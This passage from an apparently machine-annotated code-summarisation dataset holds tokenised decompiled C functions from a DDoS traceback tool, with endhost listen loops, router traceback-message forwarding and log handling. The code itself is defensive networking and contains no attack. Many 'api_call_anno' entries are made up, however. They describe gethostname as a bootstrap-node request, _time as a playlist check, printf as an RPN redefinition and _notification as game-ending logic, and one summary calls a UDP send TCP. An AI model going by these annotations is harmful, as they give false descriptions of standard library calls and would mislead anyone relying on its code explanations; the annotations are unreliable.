            "ddos_sockfd",
            "%",
            "64",
            ")",
            ";",
            "rfds",
            ".",
            "fds_bits",
            "[",
            "trbak_sockfd",
            "/",
            "64",
            "]",
            "|",
            "=",
            "1L",
            "L",
            "<",
            "<",
            "(",
            "trbak_sockfd",
            "%",
            "64",
            ")",
            ";",
            "v2",
            "=",
            "ddos_sockfd",
            ";",
            "if",
            "(",
            "trbak_sockfd",
            ">",
            "=",
            "ddos_sockfd",
            ")",
            "v2",
            "=",
            "trbak_sockfd",
            ";",
            "rc",
            "=",
            "select",
            "(",
            "v2",
            "+",
            "1",
            ",",
            "&",
            "rfds",
            ",",
            "0L",
            "L",
            ",",
            "0L",
            "L",
            ",",
            "0L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "rc",
            "<",
            "0",
            ")",
            "break",
            ";",
            "if",
            "(",
            "(",
            "rfds",
            ".",
            "fds_bits",
            "[",
            "ddos_sockfd",
            "/",
            "64",
            "]",
            "&",
            "(",
            "1L",
            "L",
            "<",
            "<",
            "(",
            "ddos_sockfd",
            "%",
            "64",
            ")",
            ")",
            ")",
            "!",
            "=",
            "0",
            ")",
            "{",
            "endhost_handle_ddos_notification",
            "(",
            "ddos_sockfd",
            ")",
            ";",
            "}",
            "else",
            "if",
            "(",
            "(",
            "rfds",
            ".",
            "fds_bits",
            "[",
            "trbak_sockfd",
            "/",
            "64",
            "]",
            "&",
            "(",
            "1L",
            "L",
            "<",
            "<",
            "(",
            "trbak_sockfd",
            "%",
            "64",
            ")",
            ")",
            ")",
            "!",
            "=",
            "0",
            ")",
            "{",
            "rc",
            "=",
            "endhost_handle_traceback_message",
            "(",
            "trbak_sockfd",
            ")",
            ";",
            "if",
            "(",
            "rc",
            ")",
            "return",
            "rc",
            ";",
            "}",
            "}",
            "perror",
            "(",
            "\"Error on select. Reason\"",
            ")",
            ";",
            "return",
            "rc",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__readfsq` is utilized to read the value stored in the FS segment register on x86-64 architectures, typically used for accessing thread-local storage (TLS) or other system-specific data structures.",
            "The `memset` function is used to fill a block of memory with a particular value, typically used for initializing or resetting memory buffers or data structures to a known value.",
            "The `_notification` function appears to handle various aspects of logging, raising notifications, and managing game-ending conditions within a larger application or system, likely serving as a centralized mechanism for notifying users or handling critical events."
        ],
        "longer_label": "The provided code is a C function `endhost_listen_loop` implementing a loop that uses the `select` system call to monitor multiple socket descriptors for readability, handling DDoS notifications on one socket and traceback messages on another, while utilizing `__readfsqword` for accessing thread-local storage and `memset` for initializing memory, with the potential to return an error code."
    },
    {
        "id": 293,
        "docstring_tokens": [
            "The",
            "function",
            "endhost_create_logfile",
            "creates",
            "a",
            "log",
            "file",
            "named",
            "hostname.endhost.log",
            "in",
            "write",
            "mode",
            "and",
            "assigns",
            "it",
            "to",
            "the",
            "loghdl",
            "variable",
            "of",
            "the",
            "input",
            "struct",
            ",",
            "with",
            "error",
            "handling",
            "to",
            "exit",
            "the",
            "program",
            "if",
            "the",
            "file",
            "creation",
            "fails",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "endhost_input_t",
            "*",
            "input",
            ")",
            "{",
            "char",
            "hostname",
            "[",
            "64",
            "]",
            ";",
            "char",
            "filename",
            "[",
            "80",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v3",
            ";",
            "v3",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "if",
            "(",
            "gethostname",
            "(",
            "hostname",
            ",",
            "0x40uL",
            "L",
            ")",
            ")",
            "__assert_fail",
            "(",
            "\"ret == 0\"",
            ",",
            "\"endhost.c\"",
            ",",
            "0x27Du",
            ",",
            "\"endhost_create_logfile\"",
            ")",
            ";",
            "snprintf",
            "(",
            "filename",
            ",",
            "0x50uL",
            "L",
            ",",
            "\"%s.endhost.log\"",
            ",",
            "hostname",
            ")",
            ";",
            "input",
            "-",
            ">",
            "loghdl",
            "=",
            "fopen",
            "(",
            "filename",
            ",",
            "off_542E",
            ")",
            ";",
            "if",
            "(",
            "!",
            "input",
            "-",
            ">",
            "loghdl",
            ")",
            "{",
            "perror",
            "(",
            "\"Error creating output file. Reason\"",
            ")",
            ";",
            "exit",
            "(",
            "0",
            ")",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function \"__readfsqword\" is utilized to read an unsigned 64-bit integer from a specific offset within the FS segment register, commonly used in low-level programming for accessing thread information or other system-specific data structures.",
            "The `hostname` function likely facilitates sending a \"get nodes\" request to a bootstrap node in a decentralized network, using UDP, to establish connections based on IP, port, and public key parameters.",
            "The `assert` function is used for runtime assertions, ensuring that certain conditions hold true during program execution, otherwise triggering an error or aborting the program.",
            "The `snprintf` function is used to safely format and write formatted data to a string buffer, ensuring no buffer overflow, as demonstrated in the code snippets where it constructs file paths without risking buffer overflows."
        ],
        "longer_label": "The code creates a log file named after the local hostname, utilizing system-specific functions and error handling mechanisms."
    },
    {
        "id": 294,
        "docstring_tokens": [
            "The",
            "code",
            "sends",
            "an",
            "end",
            "signal",
            "to",
            "all",
            "routers",
            "in",
            "a",
            "network",
            "using",
            "a",
            "UDP",
            "socket",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            ")",
            "{",
            "unsigned",
            "int",
            "i",
            ";",
            "int",
            "sockfd",
            ";",
            "int",
            "rc",
            ";",
            "sockaddr_in",
            "srvaddr",
            ";",
            "unsigned",
            "__int64",
            "v5",
            ";",
            "v5",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "sockfd",
            "=",
            "socket",
            "(",
            "2",
            ",",
            "2",
            ",",
            "0",
            ")",
            ";",
            "if",
            "(",
            "sockfd",
            ">",
            "=",
            "0",
            ")",
            "{",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            "input",
            ".",
            "num_routers",
            ">",
            "i",
            ";",
            "+",
            "+",
            "i",
            ")",
            "{",
            "memset",
            "(",
            "&",
            "srvaddr",
            ",",
            "0",
            ",",
            "sizeof",
            "(",
            "srvaddr",
            ")",
            ")",
            ";",
            "srvaddr",
            ".",
            "sin_family",
            "=",
            "2",
            ";",
            "srvaddr",
            ".",
            "sin_port",
            "=",
            "htons",
            "(",
            "input",
            ".",
            "tcp_port",
            ")",
            ";",
            "srvaddr",
            ".",
            "sin_addr",
            ".",
            "s_addr",
            "=",
            "input",
            ".",
            "routers",
            "[",
            "i",
            "]",
            ".",
            "router_addr",
            ";",
            "rc",
            "=",
            "sendto",
            "(",
            "sockfd",
            ",",
            "\"End marking\"",
            ",",
            "0xBuL",
            "L",
            ",",
            "0",
            ",",
            "(",
            "const",
            "struct",
            "sockaddr",
            "*",
            ")",
            "&",
            "srvaddr",
            ",",
            "0x10u",
            ")",
            ";",
            "if",
            "(",
            "rc",
            "<",
            "0",
            ")",
            "{",
            "perror",
            "(",
            "\"Error sending end signal. Reason\"",
            ")",
            ";",
            "return",
            "rc",
            ";",
            "}",
            "}",
            "close",
            "(",
            "sockfd",
            ")",
            ";",
            "return",
            "0",
            ";",
            "}",
            "else",
            "{",
            "perror",
            "(",
            "\"Error creating socket. Reason\"",
            ")",
            ";",
            "return",
            "sockfd",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__readfsq` is used to read a 64-bit value from the FS segment register, commonly employed in low-level programming for accessing thread-local storage or kernel data structures with high precision and efficiency.",
            "The `memset` function is used to fill a block of memory with a particular value, typically used for initializing memory to zero or a specific byte pattern, and it's implemented in various ways across different code snippets provided, including custom implementations and leveraging built-in compiler intrinsics."
        ],
        "longer_label": "The given C function `endhost_send_end_signal_to_all_router` sends an end signal to all routers in a network using TCP, utilizing low-level programming techniques such as reading from the FS segment register and memory initialization, while handling socket creation and error reporting."
    },
    {
        "id": 295,
        "docstring_tokens": [
            "The",
            "code",
            "initializes",
            "sockets",
            ",",
            "reads",
            "input",
            ",",
            "creates",
            "a",
            "logfile",
            ",",
            "sets",
            "up",
            "and",
            "listens",
            "on",
            "sockets",
            ",",
            "sends",
            "a",
            "signal",
            "to",
            "routers",
            ",",
            "closes",
            "sockets",
            ",",
            "frees",
            "memory",
            ",",
            "and",
            "returns",
            "0",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "int",
            "argc",
            ",",
            "const",
            "char",
            "*",
            "*",
            "argv",
            ",",
            "const",
            "char",
            "*",
            "*",
            "envp",
            ")",
            "{",
            "int",
            "ddos_sockfd",
            ";",
            "int",
            "trbak_sockfd",
            ";",
            "memset",
            "(",
            "&",
            "input",
            ",",
            "0",
            ",",
            "sizeof",
            "(",
            "input",
            ")",
            ")",
            ";",
            "endhost_read_input",
            "(",
            "&",
            "input",
            ",",
            "(",
            "char",
            "*",
            "*",
            ")",
            "argv",
            ",",
            "argc",
            ")",
            ";",
            "endhost_create_logfile",
            "(",
            "&",
            "input",
            ")",
            ";",
            "ddos_sockfd",
            "=",
            "endhost_create_socket",
            "(",
            "0x7F000001u",
            ",",
            "0xFB41u",
            ",",
            "0",
            ")",
            ";",
            "if",
            "(",
            "ddos_sockfd",
            "<",
            "0",
            ")",
            "return",
            "ddos_sockfd",
            ";",
            "trbak_sockfd",
            "=",
            "endhost_create_socket",
            "(",
            "0",
            ",",
            "input",
            ".",
            "udp_port",
            ",",
            "1u",
            ")",
            ";",
            "if",
            "(",
            "trbak_sockfd",
            "<",
            "0",
            ")",
            "return",
            "ddos_sockfd",
            ";",
            "endhost_listen_loop",
            "(",
            "ddos_sockfd",
            ",",
            "trbak_sockfd",
            ")",
            ";",
            "endhost_send_end_signal_to_all_router",
            "(",
            ")",
            ";",
            "close",
            "(",
            "ddos_sockfd",
            ")",
            ";",
            "close",
            "(",
            "trbak_sockfd",
            ")",
            ";",
            "tdestroy",
            "(",
            "attacker_tree",
            ",",
            "(",
            "__free_fn_t",
            ")",
            "endhost_free_attacker",
            ")",
            ";",
            "if",
            "(",
            "input",
            ".",
            "routers",
            ")",
            "free",
            "(",
            "input",
            ".",
            "routers",
            ")",
            ";",
            "return",
            "0",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `_read` function appears to be part of a file system implementation, possibly within a FUSE (Filesystem in Userspace) project, responsible for reading directory entries and handling file operations like traversal and error checking.",
            "The function `_create` appears to be part of a program that manages playlists, specifically loading playlist files from a directory using `pl_load_one` and creating a default playlist if necessary.",
            "The function `_create_socket` is likely intended to create a socket for network communication, possibly with options for binding or not binding the socket to a specific address and port.",
            "The function `_listen_loop` appears to be a part of a network-related module, possibly involved in listening for incoming connections or messages on a socket, as indicated by the presence of socket-related code snippets and the function name itself.",
            "The function \"to_all_routerclose\" likely closes connections or shuts down operations across multiple routers, as indicated by the name suggesting a broad action applied to all routers."
        ],
        "longer_label": "The code appears to be a C program that sets up sockets for DDoS (Distributed Denial of Service) and tracking back purposes, utilizing functions for reading input, creating log files, and managing network communication, possibly within the context of a network security or monitoring application."
    },
    {
        "id": 296,
        "docstring_tokens": [
            "This",
            "code",
            "defines",
            "a",
            "function",
            "that",
            "prints",
            "out",
            "usage",
            "information",
            "for",
            "a",
            "router",
            "program",
            ",",
            "including",
            "command",
            "line",
            "options",
            "and",
            "their",
            "descriptions",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "char",
            "*",
            "progname",
            ")",
            "{",
            "int",
            "i",
            ";",
            "i",
            "=",
            "0",
            ";",
            "puts",
            "(",
            "\"\\nUsage:\\n router OPTIONS\\n\"",
            ")",
            ";",
            "while",
            "(",
            "long_options",
            "[",
            "i",
            "]",
            ".",
            "name",
            ")",
            "{",
            "printf",
            "(",
            "\" -%c, --%-13s %s\\n\"",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "long_options",
            "[",
            "i",
            "]",
            ".",
            "val",
            ",",
            "long_options",
            "[",
            "i",
            "]",
            ".",
            "name",
            ",",
            "options_help",
            "[",
            "i",
            "]",
            ")",
            ";",
            "+",
            "+",
            "i",
            ";",
            "}",
            "putchar",
            "(",
            "10",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `printf `printf` function is being redefined and used in the provided code snippets, primarily for formatting output and potentially for manipulating RPN (Reverse Polish Notation) calculations."
        ],
        "longer_label": "The code defines a function `router_print_usage` which prints the usage options for a program, iterating through a list of long options and their corresponding help messages using `printf`, possibly for RPN calculations, and then adds a newline character."
    },
    {
        "id": 297,
        "docstring_tokens": [
            "The",
            "function",
            "router_read_input",
            "reads",
            "input",
            "arguments",
            "from",
            "the",
            "command",
            "line",
            "and",
            "assigns",
            "them",
            "to",
            "the",
            "corresponding",
            "fields",
            "in",
            "the",
            "router_input_t",
            "structure",
            ",",
            "ensuring",
            "all",
            "required",
            "options",
            "are",
            "specified",
            "and",
            "valid",
            "port",
            "numbers",
            "are",
            "provided",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "router_input_t",
            "*",
            "input",
            ",",
            "char",
            "*",
            "*",
            "argv",
            ",",
            "int",
            "argc",
            ")",
            "{",
            "int",
            "opt_idx",
            ";",
            "int",
            "opt",
            ";",
            "unsigned",
            "__int64",
            "v6",
            ";",
            "v6",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "opt_idx",
            "=",
            "0",
            ";",
            "while",
            "(",
            "1",
            ")",
            "{",
            "opt",
            "=",
            "getopt_long",
            "(",
            "argc",
            ",",
            "argv",
            ",",
            "\"he:t:p:u:\"",
            ",",
            "long_options",
            ",",
            "&",
            "opt_idx",
            ")",
            ";",
            "if",
            "(",
            "opt",
            "=",
            "=",
            "-",
            "1",
            ")",
            "break",
            ";",
            "if",
            "(",
            "opt",
            "!",
            "=",
            "63",
            ")",
            "{",
            "if",
            "(",
            "opt",
            ">",
            "=",
            "63",
            "&",
            "&",
            "opt",
            "<",
            "=",
            "117",
            "&",
            "&",
            "opt",
            ">",
            "=",
            "101",
            "&",
            "&",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "opt",
            "-",
            "101",
            ")",
            "<",
            "=",
            "0x10",
            ")",
            "__asm",
            "{",
            "jmp",
            "rax",
            "}",
            "abort",
            "(",
            ")",
            ";",
            "}",
            "}",
            "if",
            "(",
            "!",
            "input",
            "-",
            ">",
            "tcp_port",
            "|",
            "|",
            "!",
            "input",
            "-",
            ">",
            "udp_port",
            "|",
            "|",
            "!",
            "input",
            "-",
            ">",
            "epoch",
            ")",
            "{",
            "puts",
            "(",
            "\"Please speicify all options\"",
            ")",
            ";",
            "router_print_usage",
            "(",
            "*",
            "argv",
            ")",
            ";",
            "exit",
            "(",
            "0",
            ")",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__readfsq` is used to read a 64-bit value from the FS segment register in x86 assembly language, commonly employed for accessing thread-local storage (TLS) or other system-specific data structures.",
            "The `getopt` function appears to be a part of a C program for parsing command-line arguments and options, facilitating the handling of built-in commands and the `getopts` command, possibly for a shell-like environment.",
            "The function \"router_print_usage\" likely prints out the usage instructions or help documentation for a router, possibly providing information on available commands, options, or usage syntax."
        ],
        "longer_label": "The provided code appears to be a function written in C that reads input parameters, parses command-line arguments using `getopt_long`, checks for certain options, utilizes assembly language to potentially jump to a specified address, and ensures the presence of essential options before proceeding, likely for a router application, while also incorporating a function `router_print_usage` for displaying usage instructions."
    },
    {
        "id": 298,
        "docstring_tokens": [
            "The",
            "code",
            "sends",
            "a",
            "traceback",
            "message",
            "to",
            "a",
            "specified",
            "victim",
            "address",
            "and",
            "port",
            ",",
            "using",
            "a",
            "socket",
            "address",
            "structure",
            ",",
            "and",
            "logs",
            "the",
            "message",
            "along",
            "with",
            "marking",
            "the",
            "start",
            "if",
            "not",
            "forwarding",
            "and",
            "it",
            "is",
            "the",
            "first",
            "time",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "uint32_t",
            "victim_addr",
            ",",
            "uint16_t",
            "victim_port",
            ",",
            "uint8_t",
            "forward",
            ",",
            "uint8_t",
            "*",
            "buf",
            ",",
            "uint16_t",
            "buflen",
            ",",
            "uint8_t",
            "num_ips",
            ")",
            "{",
            "int",
            "*",
            "v6",
            ";",
            "char",
            "*",
            "v7",
            ";",
            "const",
            "char",
            "*",
            "v8",
            ";",
            "double",
            "v9",
            ";",
            "sockaddr_in",
            "srvaddr",
            ";",
            "char",
            "str",
            "[",
            "16",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v15",
            ";",
            "v15",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "memset",
            "(",
            "&",
            "srvaddr",
            ",",
            "0",
            ",",
            "sizeof",
            "(",
            "srvaddr",
            ")",
            ")",
            ";",
            "srvaddr",
            ".",
            "sin_family",
            "=",
            "2",
            ";",
            "srvaddr",
            ".",
            "sin_port",
            "=",
            "htons",
            "(",
            "victim_port",
            ")",
            ";",
            "srvaddr",
            ".",
            "sin_addr",
            ".",
            "s_addr",
            "=",
            "htonl",
            "(",
            "victim_addr",
            ")",
            ";",
            "if",
            "(",
            "(",
            "int",
            ")",
            "sendto",
            "(",
            "trback_sockfd",
            ",",
            "buf",
            ",",
            "buflen",
            ",",
            "0",
            ",",
            "(",
            "const",
            "struct",
            "sockaddr",
            "*",
            ")",
            "&",
            "srvaddr",
            ",",
            "0x10u",
            ")",
            ">",
            "=",
            "0",
            ")",
            "{",
            "htonl",
            "(",
            "input",
            ".",
            "local_addr",
            ")",
            ";",
            "if",
            "(",
            "!",
            "forward",
            ")",
            "{",
            "if",
            "(",
            "started_6310",
            ")",
            "{",
            "started_6310",
            "=",
            "0",
            ";",
            "v9",
            "=",
            "_time",
            "(",
            ")",
            ";",
            "fprintf",
            "(",
            "input",
            ".",
            "loghdl",
            ",",
            "\"%.6f  startedMarking  %s\\n\"",
            ",",
            "v9",
            ",",
            "\"Traceback message\"",
            ")",
            ";",
            "}",
            "}",
            "}",
            "else",
            "{",
            "v6",
            "=",
            "__errno_location",
            "(",
            ")",
            ";",
            "v7",
            "=",
            "strerror",
            "(",
            "*",
            "v6",
            ")",
            ";",
            "v8",
            "=",
            "inet_ntop",
            "(",
            "2",
            ",",
            "&",
            "srvaddr",
            ".",
            "sin_addr",
            ",",
            "str",
            ",",
            "0x10u",
            ")",
            ";",
            "printf",
            "(",
            "\"Error sending traceback msg to %s. Reason: %s\\n\"",
            ",",
            "v8",
            ",",
            "v7",
            ")",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__read` appears to be a custom implementation for reading data from a device or file system, utilizing dynamically allocated memory for buffering and potentially interacting with device or file system drivers through function pointers or weak symbols, as evidenced by the provided code snippets.",
            "The `memset` function is a standard C function used for filling a block of memory with a particular value, often used for initialization or resetting memory regions to zero, and in the provided context, it's being implemented or redefined for specific platforms or requirements.",
            "The `htons` function is typically used to convert a 16-bit integer from host byte order to network byte order (big-endian), as demonstrated in the provided code snippet which swaps the bytes of the input 16-bit integer to comply with network byte order.",
            "The function htonl converts a 32-bit unsigned integer from host byte order to network byte order.",
            "The `_time` function likely checks if certain conditions are met to determine whether to display playlists panel and cursor position within the track window, possibly used in a media player application.",
            "The `printf` function is being redefined and used in the provided code snippets to format and output text, likely for debugging or informational purposes, with additional macros and type definitions for mathematical operations and system-specific settings."
        ],
        "longer_label": "The provided code is a C function named `router_send_traceback_message` that sends a traceback message to a specified victim address and port, handling errors, and potentially logging the event, with annotations describing certain functions like `__read`, `memset`, and `htons` used within the code."
    },
    {
        "id": 299,
        "docstring_tokens": [
            "The",
            "code",
            "intercepts",
            "and",
            "processes",
            "traceback",
            "messages",
            ",",
            "modifying",
            "and",
            "forwarding",
            "them",
            "to",
            "the",
            "victim",
            "address",
            "and",
            "port",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "const",
            "uint8_t",
            "*",
            "data",
            ",",
            "uint16_t",
            "data_len",
            ",",
            "uint32_t",
            "router_addr",
            ",",
            "uint32_t",
            "victim_addr",
            ",",
            "uint16_t",
            "victim_port",
            ")",
            "{",
            "uint8_t",
            "num_ips",
            ";",
            "uint8_t",
            "num_ipsa",
            ";",
            "uint8_t",
            "len",
            ";",
            "uint8_t",
            "buf",
            "[",
            "256",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v12",
            ";",
            "v12",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "memset",
            "(",
            "buf",
            ",",
            "0",
            ",",
            "sizeof",
            "(",
            "buf",
            ")",
            ")",
            ";",
            "if",
            "(",
            "_byteswap_ulong",
            "(",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "data",
            ")",
            "=",
            "=",
            "-",
            "559022355",
            ")",
            "{",
            "num_ips",
            "=",
            "data",
            "[",
            "5",
            "]",
            ";",
            "if",
            "(",
            "num_ips",
            ">",
            "0xFu",
            ")",
            "__assert_fail",
            "(",
            "\"num_ips < MAX_ROUTERS\"",
            ",",
            "\"router.c\"",
            ",",
            "0xE0u",
            ",",
            "\"router_intercept_traceback_msg\"",
            ")",
            ";",
            "if",
            "(",
            "data_len",
            ">",
            "=",
            "4",
            "*",
            "(",
            "unsigned",
            "int",
            ")",
            "num_ips",
            "+",
            "6",
            ")",
            "{",
            "len",
            "=",
            "4",
            "*",
            "num_ips",
            "+",
            "6",
            ";",
            "memcpy",
            "(",
            "buf",
            ",",
            "data",
            ",",
            "len",
            ")",
            ";",
            "buf",
            "[",
            "4",
            "]",
            "=",
            "2",
            ";",
            "num_ipsa",
            "=",
            "num_ips",
            "+",
            "1",
            ";",
            "buf",
            "[",
            "5",
            "]",
            "=",
            "num_ipsa",
            ";",
            "buf",
            "[",
            "len",
            "]",
            "=",
            "HIBYTE",
            "(",
            "router_addr",
            ")",
            ";",
            "buf",
            "[",
            "len",
            "+",
            "1",
            "]",
            "=",
            "BYTE2",
            "(",
            "router_addr",
            ")",
            ";",
            "buf",
            "[",
            "len",
            "+",
            "2",
            "]",
            "=",
            "BYTE1",
            "(",
            "router_addr",
            ")",
            ";",
            "buf",
            "[",
            "len",
            "+",
            "3",
            "]",
            "=",
            "router_addr",
            ";",
            "router_send_traceback_message",
            "(",
            "victim_addr",
            ",",
            "victim_port",
            ",",
            "1u",
            ",",
            "buf",
            ",",
            "4",
            "*",
            "num_ipsa",
            "+",
            "6",
            ",",
            "num_ipsa",
            ")",
            ";",
            "}",
            "else",
            "{",
            "printf",
            "(",
            "\"Rcvd shorter datagram of %u bytes. Expected %u bytes\\n\"",
            ",",
            "data_len",
            ",",
            "4",
            "*",
            "(",
            "unsigned",
            "int",
            ")",
            "num_ips",
            "+",
            "6",
            ")",
            ";",
            "}",
            "}",
            "else",
            "{",
            "puts",
            "(",
            "\"Ignoring non-traceback msg on traceback port\"",
            ")",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__readfsqword` is used to read a quadword (64 bits) from a specific offset in the segment register FS on x86 or x64 architectures, likely for accessing thread information or processor-specific data structures."
        ],
        "longer_label": "The provided code is a function `router_intercept_traceback_msg` that intercepts and processes traceback messages, utilizing low-level memory operations like reading from a specific offset in the segment register FS, checking message integrity, and forwarding the traceback message to another router."
    },
    {
        "id": 300,
        "docstring_tokens": [
            "The",
            "code",
            "processes",
            "filtered",
            "packets",
            "received",
            "by",
            "a",
            "router",
            ",",
            "checks",
            "for",
            "specific",
            "conditions",
            "related",
            "to",
            "source",
            "and",
            "destination",
            "addresses",
            "and",
            "ports",
            ",",
            "intercepts",
            "certain",
            "messages",
            ",",
            "and",
            "sends",
            "traceback",
            "messages",
            "if",
            "a",
            "random",
            "probability",
            "condition",
            "is",
            "met",
            ",",
            "updating",
            "epoch",
            "counts",
            "and",
            "logging",
            "epoch",
            "data",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "uint8_t",
            "*",
            "user",
            ",",
            "const",
            "pcap_pkthdr",
            "*",
            "hdr",
            ",",
            "const",
            "uint8_t",
            "*",
            "bytes",
            ")",
            "{",
            "__int16",
            "v3",
            ";",
            "uint32_t",
            "saddr",
            ";",
            "uint32_t",
            "v5",
            ";",
            "uint32_t",
            "daddr",
            ";",
            "uint16_t",
            "uh_dport",
            ";",
            "uint32_t",
            "epoch_cnt",
            ";",
            "const",
            "char",
            "*",
            "v9",
            ";",
            "uint32_t",
            "v10",
            ";",
            "uint16_t",
            "v11",
            ";",
            "uint32_t",
            "v12",
            ";",
            "const",
            "char",
            "*",
            "v13",
            ";",
            "__int16",
            "bytesa",
            ";",
            "uint8_t",
            "idx",
            ";",
            "uint16_t",
            "payload_len",
            ";",
            "uint16_t",
            "num_epochs",
            ";",
            "in_addr",
            "addr",
            ";",
            "router_pcap_loop_t",
            "*",
            "rinp",
            ";",
            "ether_header",
            "*",
            "ether",
            ";",
            "iphdr",
            "*",
            "ip_0",
            ";",
            "udphdr",
            "*",
            "udp",
            ";",
            "uint8_t",
            "*",
            "payload",
            ";",
            "double",
            "curr_time",
            ";",
            "char",
            "str",
            "[",
            "16",
            "]",
            ";",
            "uint8_t",
            "buf",
            "[",
            "256",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v27",
            ";",
            "v27",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "rinp",
            "=",
            "(",
            "router_pcap_loop_t",
            "*",
            ")",
            "user",
            ";",
            "memset",
            "(",
            "buf",
            ",",
            "0",
            ",",
            "sizeof",
            "(",
            "buf",
            ")",
            ")",
            ";",
            "bytesa",
            "=",
            "(",
            "_WORD",
            ")",
            "bytes",
            "+",
            "2",
            ";",
            "ether",
            "=",
            "(",
            "ether_header",
            "*",
            ")",
            "(",
            "bytes",
            "+",
            "2",
            ")",
            ";",
            "ip_0",
            "=",
            "(",
            "iphdr",
            "*",
            ")",
            "(",
            "(",
            "char",
            "*",
            ")",
            "&",
            "CONTAINING_RECORD",
            "(",
            "bytes",
            ",",
            "iphdr",
            ",",
            "tos",
            ")",
            "-",
            ">",
            "daddr",
            "+",
            "1",
            ")",
            ";",
            "udp",
            "=",
            "(",
            "udphdr",
            "*",
            ")",
            "(",
            "bytes",
            "+",
            "36",
            ")",
            ";",
            "payload",
            "=",
            "(",
            "uint8_t",
            "*",
            ")",
            "(",
            "bytes",
            "+",
            "44",
            ")",
            ";",
            "v3",
            "=",
            "*",
            "(",
            "(",
            "_WORD",
            "*",
            ")",
            "bytes",
            "+",
            "7",
            ")",
            ";",
            "if",
            "(",
            "v3",
            "!",
            "=",
            "htons",
            "(",
            "0x800u",
            ")",
            ")",
            "__assert_fail",
            "(",
            "\"ether->ether_type == htons(ETHERTYPE_IP)\"",
            ",",
            "\"router.c\"",
            ",",
            "0x11Bu",
            ",",
            "\"router_process_filtered_pkt\"",
            ")",
            ";",
            "saddr",
            "=",
            "ip_0",
            "-",
            ">",
            "saddr",
            ";",
            "if",
            "(",
            "saddr",
            "!",
            "=",
            "htonl",
            "(",
            "rinp",
            "-",
            ">",
            "router_addr",
            ")",
            ")",
            "{",
            "v5",
            "=",
            "ip_0",
            "-",
            ">",
            "saddr",
            ";",
            "if",
            "(",
            "v5",
            "=",
            "=",
            "htonl",
            "(",
            "rinp",
            "-",
            ">",
            "victim_addr",
            ")",
            ")",
            "{",
            "if",
            "(",
            "ip_0",
            "-",
            ">",
            "protocol",
            "=",
            "=",
            "17",
            ")",
            "{",
            "daddr",
            "=",
            "ip_0",
            "-",
            ">",
            "daddr",
            ";",
            "if",
            "(",
            "daddr",
            "=",
            "=",
            "htonl",
            "(",
            "rinp",
            "-",
            ">",
            "router_addr",
            ")",
            ")",
            "{",
            "uh_dport",
            "=",
            "udp",
            "-",
            ">",
            "_anon_0",
            ".",
            "_anon_0",
            ".",
            "uh_dport",
            ";",
            "if",
            "(",
            "uh_dport",
            "=",
            "=",
            "htons",
            "(",
            "input",
            ".",
            "tcp_port",
            ")",
            ")",
            "{",
            "curr_time",
            "=",
            "(",
            "double",
            ")",
            "(",
            "int",
            ")",
            "hdr",
            "-",
            ">",
            "ts",
            ".",
            "tv_usec",
            "/",
            "1000000",
            ".",
            "0",
            "+",
            "(",
            "double",
            ")",
            "(",
            "int",
            ")",
            "hdr",
            "-",
            ">",
            "ts",
            ".",
            "tv_sec",
            ";",
            "if",
            "(",
            "input",
            ".",
            "epoch_cnt",
            ")",
            "{",
            "addr",
            ".",
            "s_addr",
            "=",
            "htonl",
            "(",
            "rinp",
            "-",
            ">",
            "victim_addr",
            ")",
            ";",
            "epoch_cnt",
            "=",
            "input",
            ".",
            "epoch_cnt",
            ";",
            "v9",
            "=",
            "inet_ntop",
            "(",
            "2",
            ",",
            "&",
            "addr",
            ",",
            "str",
            ",",
            "0x10u",
            ")",
            ";",
            "fprintf",
            "(",
            "input",
            ".",
            "loghdl",
            ",",
            "\"%.6f  %-15s  %u\\n\"",
            ",",
            "input",
            ".",
            "epoch_start",
            ",",
            "v9",
            ",",
            "epoch_cnt",
            ")",
            ";",
            "}",
            "close",
            "(",
            "trback_sockfd",
            ")",
            ";",
            "fflush",
            "(",
            "input",
            ".",
            "loghdl",
            ")",
            ";",
            "fclose",
            "(",
            "input",
            ".",
